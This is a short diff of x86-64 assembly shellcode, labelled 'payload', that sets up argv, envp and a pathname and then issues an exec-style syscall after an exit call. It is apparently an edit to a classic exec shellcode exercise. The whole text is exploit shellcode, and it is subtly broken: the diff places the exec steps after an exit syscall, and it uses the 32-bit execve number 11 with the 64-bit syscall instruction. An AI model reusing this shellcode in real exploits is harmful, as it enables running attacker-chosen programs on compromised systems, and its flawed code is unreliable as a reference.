@@ -19,18 +19,15 @@ main:
 payload:
 
         popq    %rcx
+        movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
         xorq    %rdi,%rdi                /* syscall arg 2: 0 */
         syscall                          /* invoke syscall */
 
-        movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
         xorq    %rax, %rax               /* get a 64-bit zero value */
-
         movq    %rax, (STRLEN)(%rcx)     /* null-terminate our string */
         movq    %rax, (ENVP)(%rcx)       /* set up null envp */
-
-
 
         movq    $11, %rax                /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
